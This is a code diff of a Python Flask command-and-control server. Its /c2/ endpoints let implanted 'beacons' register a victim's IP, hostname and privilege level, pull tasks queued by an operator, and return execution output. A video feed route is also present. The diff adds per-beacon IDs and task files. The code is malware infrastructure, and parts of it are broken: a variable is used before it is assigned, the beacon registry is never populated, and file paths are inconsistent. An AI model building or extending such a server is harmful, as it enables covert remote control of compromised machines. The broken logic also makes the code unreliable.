@@ -4,6 +4,8 @@ import ssl
 import os
 from agent import Agent
 from werkzeug.exceptions import BadRequest
+import uuid
+
 
 app = Flask(__name__)
 
@@ -22,12 +24,14 @@ agents= Agent(
 
 )
 
+beacons = {}
+
 def initial_setup():
-    base_data_path = "../../data"
-    subdirectories = ["beacon", "tasks", "logs"]
+    base_data_path = "/home/exe/data"
+    subdirectories = ["beacons", "tasks", "logs"]
 
     if not os.path.exists (base_data_path):
-        os.makedirs(base_data_path, "/beacon", "/tasks")
+        os.makedirs(base_data_path)
 
         for subdir in subdirectories:
             full_path = os.path.join(base_data_path, subdir)
@@ -43,7 +47,7 @@ def web_root():
 # Initial beacon register, beacon returns 2 or 3 arguments
 @app.route("/c2/register_beacon", methods=['POST'])
 def register_beacon_route():
-    beacon_path = os.path.join(agents.get_beacon_path(), "beacon")
+    beacon_path = os.path.join(agents.get_beacon_path(), f"{beacon_id}.txt")
 
     try:
         data = request.json
@@ -57,6 +61,8 @@ def register_beacon_route():
         if not all([remote_ip, remote_hostname, current_permission]):
             return jsonify({"Message": "Some data is missing"}), 400
 
+        beacon_id = str(uuid.uuid4())
+
     except BadRequest as e:
         return jsonify({"Error": f"Invalid JSON data: {str(e)}"}), 400
             
@@ -65,6 +71,7 @@ def register_beacon_route():
     try:
         with open(beacon_path, "a") as f:
             f.write(f"{remote_hostname},{remote_ip},{current_permission}\n")
+
     except PermissionError:
         return jsonify({"Error": "Permission denied while writing beacon data"}), 403
     except FileNotFoundError:
@@ -77,19 +84,54 @@ def register_beacon_route():
 # Beacon reads from this endpoint, server writes the data to file and endpoint reflects it
 @app.route("/c2/read_task", methods=['GET'])
 def read_task_route():
-    return Agent.read_task(agents)
+    beacon_id = request.args.get('beacon_id')
+
+    if not beacon_id or beacon_id not in beacons:
+        return jsonify({"Error": "Invalid beacon ID"}), 404
+    
+    task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")
+
+    if not os.path.exists(task_file):
+        return jsonify({"Error": "Task file not found"}), 404
+
+    with open(task_file, "r") as f:
+        task = f.readlines()
+
+    return jsonify({"task": task}), 200
+
+
+
 
 # Operator writes tasks and commands to this endpoint
 @app.route ("/c2/write_task", methods=['POST'])
 def write_task_route():
-    task = request.json.get('task')
-    print("Task")
-    if not task:
-        return jsonify({"Error": "No task provided"}), 400  
-    
-    reflected_output = agents.write_task(task)
-    return jsonify({"message": reflected_output}), 200
+    try:
+        data = request.json
+        if not data:
+            return jsonify({"Error": "No JSON data provided"}), 400
 
+        beacon_id = data.get('beacon_id')
+        task = data.get('task')
+
+        if not beacon_id or not task:
+            return jsonify({"Error": "Beacon ID or task is missing"}), 400
+
+        # Check if beacon exists
+        if beacon_id not in beacons:
+            return jsonify({"Error": "Invalid beacon ID"}), 404
+
+        # Write the task to the beacon's task file
+        task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")
+        os.makedirs(os.path.dirname(task_file), exist_ok=True)
+
+        with open(task_file, "a") as f:
+            f.write(f"{task}\n")
+
+        return jsonify({"message": "Task assigned successfully!"}), 200
+
+    except OSError as e:
+        return jsonify({"Error": f"Failed to assign task: {str(e)}"}), 500
+    
 # Beacon writes data to this endpoint
 @app.route ("/c2/return_execution_data", methods= ['POST'])
 def randomshit():
@@ -113,7 +155,7 @@ def video_feed():
 
 if __name__ == '__main__':
 
-    base_data_path = "../../data"
+    base_data_path = "/home/exe/data"
     subdirectories = ["beacon", "tasks", "logs"]
 
     if not os.path.exists(base_data_path) or any(not os.path.exists(os.path.join(base_data_path, subdir)) for subdir in subdirectories):
